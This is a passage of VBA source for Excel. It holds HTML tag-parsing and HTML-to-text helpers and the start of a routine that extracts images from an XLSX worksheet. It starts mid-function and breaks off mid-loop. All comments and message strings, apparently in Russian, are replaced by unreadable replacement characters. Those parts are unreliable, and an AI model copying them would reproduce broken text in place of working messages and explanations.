    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim res$, Pattern$, SelfClosing As Boolean, NeedContent As Boolean, ResultType$, ResultIndex$, ResultsCount&, ind&
    Dim PatternPrefix$, PatternSuffix$, AttrValuePattern$, Add_URL_Prefix$
    Const SelfClosingTags = ",area,base,basefont,br,col,frame,hr,img,input,isindex,link,meta,param,embed,"
    Const ASTERISK_PATTERN = "[A-Za-z0-9_-]*"
    AttrName$ = Trim(AttrName$): AttrValue$ = Trim(AttrValue$): TagName$ = Trim(TagName$)
    If TagName$ = "Any Tag" Then TagName$ = "[a-zA-Z1-6]+"
    If TagName$ = "" Then GetTags = "GetTags ERROR: 'TagName' parameter is blank": Exit Function

    If InStr(1, AttrValue$, "*") Then
        If AttrValue$ Like "[*]*" Then AttrValue$ = ASTERISK_PATTERN & Mid(AttrValue$, 2)
        If AttrValue$ Like "*[A-Za-z0-9_-][*]" Then AttrValue$ = Left(AttrValue$, Len(AttrValue$) - 1) & ASTERISK_PATTERN
    End If

    PatternPrefix$ = "<(" & TagName$ & ")\b"
    PatternSuffix$ = "[^>]*>"
    Select Case True
        Case AttrName$ & AttrValue$ = ""        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Pattern$ = PatternPrefix$ & PatternSuffix$

        Case AttrName$ = "AttributesPattern"        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| regexp |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If InStr(1, AttrValue$, ">") + InStr(1, AttrValue$, "<") Then _
               GetTags = "GetTags ERROR: 'AttributeValue' parameter contains unacceptable symbols ('<' or '>')": Exit Function
            Pattern$ = PatternPrefix$ & "[^>]*" & AttrValue$ & PatternSuffix$

        Case Else        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| name / id / class
            AttrValuePattern$ = "(?:(?:" & AttrValue$ & "\b)|(?:['""](|[^<>'""]* )\b" & AttrValue$ & "\b(| [^<>'""]*)['""]))"
            Pattern$ = PatternPrefix$ & "[^>]*\b" & AttrName$ & "\s*=\s*" & AttrValuePattern$ & PatternSuffix$
    End Select
    'Debug.Print Pattern$

    Result$ = Application.Trim(Result$): If Result$ = "" Then GetTags = "GetTags ERROR: 'Result' parameter is blank": Exit Function
    ResultType$ = Split(Result$)(0)
    ResultIndex$ = Split(Result$, , 2)(1)

    SelfClosing = SelfClosingTags Like "*," & TagName$ & ",*"
    NeedContent = InStr(1, "|innerHTML|outerHTML|ConvertToText|DeleteTags|ReplaceTagWithItsText|REPLACE|", "|" & ResultType$ & "|") > 0
    'If (Not NeedContent) And (ResultIndex$ <> "") Then GetTags = "GetTags ERROR: Unsupported 'Result' parameter ('item index' is available for 'innerHTML'/'outerHTML'/'text' result types only)": Exit Function

    Dim v, content$, cnt&, i&, TextAfterHeader$, TagHeader$, TagFooter$, TagContent$, attr$, txtlen&, NN&, SourceTXT$
    If ResultType$ = "REPLACE" Then SourceTXT$ = txt

    With REGEXP
StartSearching:
        .IgnoreCase = True: .Pattern = Pattern$
        If .test(txt) Then
            For Each v In .Execute(txt)
                DoEvents
                NN& = NN& + 1
                'If NN& Mod 50 = 0 Then Debug.Print "NN&=" & NN&
                TagHeader$ = "": TagHeader$ = v.Value
                'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd|" & TagHeader$ & "|fffd|", v.FirstIndex

                If NeedContent And Not SelfClosing Then
                    TagName$ = v.submatches.Item(0)
                    TextAfterHeader$ = "": TextAfterHeader$ = Mid(txt, v.FirstIndex + Len(TagHeader$) + 1)

                    TagContent$ = GetTagInnerHTML(TextAfterHeader$, TagName$)
                    TagFooter$ = "</" & TagName$ & ">"
                    If (ResultType$ = "outerHTML") Or (ResultType$ = "REPLACE") _
                       Or (ResultType$ = "DeleteTags") Or (ResultType$ = "ReplaceTagWithItsText") Then
                        content$ = TagHeader$ & TagContent$ & TagFooter$
                    Else
                        content$ = TagContent$
                    End If
                Else
                    content$ = TagHeader$
                    TagContent$ = "": TagFooter$ = ""
                End If

                Select Case ResultType$
                    Case "innerHTML", "outerHTML", "TagHeaderOnly"        ' do nothing

                    Case "DeleteTags"
                        txtlen& = Len(txt): txt = Replace(txt, content$, "")
                        content$ = "": If Len(txt) < txtlen& Then GoTo StartSearching        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

                    Case "ReplaceTagWithItsText"
                        txtlen& = Len(txt): txt = Replace(txt, content$, ConvertHTMLtoText(content$))
                        content$ = "": If Len(txt) < txtlen& Then GoTo StartSearching        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

                    Case "ConvertToText"        ' convert to text
                        content$ = ConvertHTMLtoText(content$)

                    Case Else        ' get attribute value
                        content$ = GetAttributeFromTag(content$, ResultType$)

                End Select

                If Len(content$) Then
                    ResultsCount& = ResultsCount& + 1
                    GetTags = GetTags & IIf(Len(GetTags), ARSEP, "") & content$
                    If Val(ResultIndex$) Then If Val(ResultIndex$) = ResultsCount& Then GetTags = content$: Exit Function
                End If
            Next v
        End If
    End With

    If (ResultType$ = "DeleteTags") Or (ResultType$ = "ReplaceTagWithItsText") Then GetTags = txt: Exit Function
    If ResultType$ = "REPLACE" Then GetTags = SourceTXT$: Exit Function

    If ResultIndex$ = "join" Then GetTags = Replace(GetTags, ARSEP, vbNewLine): Exit Function

    If Len(ResultIndex$) * Len(GetTags) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If InStr(1, ResultIndex$, "last", vbTextCompare) > 0 Then
            ind& = UBound(Split(GetTags, ARSEP)) + Val(Split(ResultIndex$, "last")(1))
        Else
            ind& = Fix(Val(ResultIndex$)) - 1
        End If

        If ind& >= 0 And ind& <= UBound(Split(GetTags, ARSEP)) Then
            GetTags = Split(GetTags, ARSEP)(ind&)
        Else
            GetTags = ""
        End If
    End If
End Function

Function GetTagInnerHTML(ByVal txt$, ByVal TagName$) As String
    On Error Resume Next
    Dim ClosingTag$, arr, i&, nOPENING&
    ClosingTag$ = "</" & TagName$ & ">"
    If InStr(1, txt, ClosingTag$, vbTextCompare) = 0 Then Exit Function
    arr = Split(txt, ClosingTag$, , vbTextCompare)
    For i = LBound(arr) To UBound(arr) - 1        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| -1, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| txt$)
        If Len(arr(i)) Then
            nOPENING& = nOPENING& + UBound(Split(arr(i), "<" & TagName$ & ">")) + UBound(Split(arr(i), "<" & TagName$ & " "))
        End If
        GetTagInnerHTML = GetTagInnerHTML & arr(i) & IIf(nOPENING& <> i, ClosingTag$, "")
        If nOPENING& = i Then Exit Function
    Next i
    GetTagInnerHTML = ""
End Function

Function ConvertHTMLtoText(ByVal txt$, Optional RemoveExtraLF As Boolean = False) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| DOM
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MSHTML
    On Error Resume Next
    Const ADD_TAB$ = "</th><th>,</td><td>"
    Const ADD_NL$ = "<div>,<p>,<table>,</table>,<img>,<h1>,<h2>,<h3>,<h4>,<h5>,<h6>,<br>,<hr>,</tr>,</li>"

    Dim Tag, char, arr, cnt&, i&
    With REGEXP

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTML
        If txt$ Like "*<!--*-->*" Then
            arr = "": arr = Split(txt, "<!--")
            For i = LBound(arr) + 1 To UBound(arr)
                cnt& = 0: cnt& = UBound(Split(arr(i), "-->"))
                If cnt& = 0 Then arr(i) = "" Else arr(i) = Split(arr(i), "-->")(cnt&)
            Next i
            txt = Join(arr, "")
        End If

        txt$ = CloseUnclosedTags(txt$)
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        .Pattern = "(<[A-Za-z1-6]+)[^<>]*(>)"
        txt$ = .Replace(txt$, "$1$2")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
        .Pattern = ">\s*<"
        txt$ = .Replace(txt$, "><")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If txt$ Like "*<script>*</script>*" Then
            arr = "": arr = Split(txt, "<script>")
            For i = LBound(arr) + 1 To UBound(arr)
                cnt& = 0: cnt& = UBound(Split(arr(i), "</script>"))
                If cnt& = 0 Then arr(i) = "" Else arr(i) = Split(arr(i), "</script>")(cnt&)
            Next i
            txt = Join(arr, "")
        End If

        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <body>
        If txt Like "*<body>*" Then txt = Split(txt, "<body>")(1)

        txt = Replace(txt, vbNewLine, vbLf): txt = Replace(txt, vbLf, vbNewLine)
        MultiReplace txt, "<br>" & vbNewLine, "<br>"
        MultiReplace txt, vbNewLine & "<br>", "<br>"

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        For Each Tag In Split(ADD_NL$, ",")
            txt = Replace(txt, Tag, vbNewLine, , , vbTextCompare)
        Next Tag
        For Each Tag In Split(ADD_TAB$, ",")
            txt = Replace(txt, Tag, vbTab, , , vbTextCompare)
        Next Tag

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        .Pattern = "<[^<>]+>"
        txt$ = .Replace(txt$, "")

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each char In Split(HTML_SP$, ";")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| &|fffd|opy; |fffd| &nbs|fffd|;
            If InStr(1, txt$, Split(char, "=")(0), vbBinaryCompare) Then
                txt$ = Replace(txt$, "&" & Split(char, "=")(0) & ";", ChrW(Val(Split(char, "=")(1))), , , vbBinaryCompare)
            End If
        Next char
        .Pattern = "&#(\d{2,5});"        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| &#84l0;
        If .test(txt$) Then
            For Each char In .Execute(txt)
                txt$ = Replace(txt$, char.Value, ChrW(Val(char.submatches.Item(0))))
            Next
        End If

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        MultiReplace txt, " " & vbTab, vbTab: MultiReplace txt, vbTab & " ", vbTab
        MultiReplace txt, vbTab & vbNewLine, vbNewLine: MultiReplace txt, vbNewLine & vbTab, vbNewLine
        MultiReplace txt$, vbNewLine & vbNewLine & vbNewLine, vbNewLine & vbNewLine
        MultiReplace txt, vbNewLine & " " & vbNewLine, vbNewLine
        MultiReplace txt, " " & vbNewLine, vbNewLine

        If RemoveExtraLF Then MultiReplace txt$, vbNewLine & vbNewLine, vbNewLine

        While txt$ Like "*" & vbNewLine: txt = Left(txt, Len(txt) - Len(vbNewLine)): Wend
        While txt$ Like vbNewLine & "*": txt = Mid(txt, Len(vbNewLine) + 1): Wend

    End With
    Erase arr: Err.Clear
    ConvertHTMLtoText = txt$
End Function

Function REGEXP()
    On Error Resume Next
    Static REGEXP_ As Object
    If REGEXP_ Is Nothing Then Set REGEXP_ = CreateObject("VBScript.RegExp"): REGEXP_.Global = True
    Set REGEXP = REGEXP_
End Function

Sub MultiReplace(ByRef txt$, ByVal Find$, ByVal Replacement$)
    On Error Resume Next: Dim n&
    If InStr(1, Replacement$, Find$, vbBinaryCompare) Then Exit Sub        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    While (InStr(1, txt$, Find$, vbBinaryCompare) > 0) And (n < 100)
        n = n + 1: txt$ = Replace(txt$, Find$, Replacement$)
    Wend
End Sub

Function CloseUnclosedTags(ByVal txt$) As String
    On Error Resume Next: CloseUnclosedTags = txt$: Dim char
    With REGEXP
        .Pattern = "(<[A-Za-z1-6]+\b[^<>]*)(<[A-Za-z1-6]+\b)"
        If .test(txt$) Then CloseUnclosedTags = .Replace(txt$, "$1>$2")
    End With
End Function

Function GetAttributeFromTag(ByVal content$, ByVal AttrName$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTML |fffd||fffd||fffd||fffd| content$
    On Error Resume Next: Dim attr$
    attr$ = "": content$ = Split(content$, ">")(0)
    content$ = Replace(Replace(Replace(content$, "= ", "="), " =", "="), vbTab, " ")
    attr$ = Trim(Split(content$, " " & AttrName$ & "=", 2)(1))
    Select Case Mid(attr$, 1, 1)
        Case """", "'": attr$ = Split(attr$, Mid(attr$, 1, 1))(1)
        Case Else: attr$ = Split(attr$, " ")(0)
    End Select
    GetAttributeFromTag = ReplaceNamedCharacters(attr$)        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|  &amp; |fffd||fffd| & (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
End Function

Function ReplaceNamedCharacters(ByVal txt$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ConvertHTMLtoText, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim char

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    For Each char In Split(HTML_SP$, ";")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| &|fffd|opy; |fffd| &nbs|fffd|;
        If InStr(1, txt$, Split(char, "=")(0), vbBinaryCompare) Then
            txt$ = Replace(txt$, "&" & Split(char, "=")(0) & ";", ChrW(Val(Split(char, "=")(1))), , , vbBinaryCompare)
        End If
    Next char

    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| &#84l0;
    If InStr(1, txt, "*&*;*") > 0 Then
        With REGEXP
            .Pattern = "&#(\d{2,5});"
            If .test(txt$) Then
                For Each char In .Execute(txt)
                    txt$ = Replace(txt$, char.Value, ChrW(Val(char.submatches.Item(0))))
                Next
            End If
        End With
    End If
    ReplaceNamedCharacters = txt
End Function

Function JSON_decode(ByVal txt$) As String
    On Error Resume Next
    REGEXP.Pattern = "\\u[A-Fa-f0-9]{4}"

    JSON_decode = txt$
    Dim coll As New Collection, char$, Item As Variant, objMatches As Object, m As Object
    If REGEXP.test(txt$) Then
        Set objMatches = REGEXP.Execute(txt$)        ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| \u034a
        For Each m In objMatches
            coll.Add m.Value, CStr(m.Value)
        Next
    End If

    For Each Item In coll        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
        char$ = ChrW(Val(Replace(Item, "\u", "&h")))        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| \u0410 |fffd| |fffd||fffd||fffd|
        txt = Replace(txt, Item, char$)
    Next

    For Each Item In Array("""", "/")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        txt = Replace(txt, "\" & Item, Item)
    Next
    txt = Replace(txt, "\n", vbNewLine)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

    JSON_decode = txt$
End Function
Attribute VB_Name = "mod_zip"
'---------------------------------------------------------------------------------------
' Module        : mod_zip                    Version:
' Author        : Igor Vakhnenko                   Date: 25.11.2018
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Private Module

Private Sub test_GetImagesFromWorksheet()
    Dim dic As Dictionary, ErrMsg$, Key
    Set dic = GetImagesFromWorksheet(, ErrMsg$)
    If dic Is Nothing Then
        'MsgBox ErrMsg$, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| Excel"
        Exit Sub
    End If

    Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    For Each Key In dic.Keys
        Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| " & Key & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & dic.Item(Key)
    Next
End Sub

Function GetImagesFromWorksheet(Optional ByRef sh As Worksheet, Optional ByRef ErrMsg$, _
                                Optional ByRef pi As ProgressIndicator) As Dictionary
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| XLSX, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| XLSX |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|,
    ' |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|=|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| row-column,
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|||fffd||fffd||fffd|
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ErrMsg$ |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

    On Error Resume Next
    Dim ZIP_filename$, folder$, XLfolder$, drawingsFolder$, relsFolder$, dic As New Dictionary

    pi.StartNewAction 2, 10, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| XLSX"
    ZIP_filename$ = SaveSheetAsZIP(sh, , ErrMsg$)
    If ZIP_filename$ = "" Then Exit Function

    pi.StartNewAction 10, 40, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| XLSX (ZIP)", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

    folder$ = ExtractFromArchieve(ZIP_filename$, , , , ErrMsg$)
    If folder$ = "" Then Exit Function

    pi.StartNewAction 40, 45, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
    XLfolder$ = folder$ & "xl\"
    If Dir(XLfolder$, vbDirectory) = "" Then ErrMsg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| xl |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
    drawingsFolder$ = folder$ & "xl\drawings\"
    If Dir(drawingsFolder$, vbDirectory) = "" Then ErrMsg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| xl\drawings\ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
    relsFolder$ = folder$ & "xl\drawings\_rels\"
    If Dir(relsFolder$, vbDirectory) = "" Then ErrMsg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| xl\drawings\_rels\ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function

    Dim drawingsFiles As Collection, file, DrawingFilename$, RelsFilename$, RelsDic As Dictionary, ImagesDic As Dictionary, Key
    Set drawingsFiles = FilenamesCollection(drawingsFolder$, "*.[xv]ml", 1)

    For Each file In drawingsFiles
        DrawingFilename$ = file
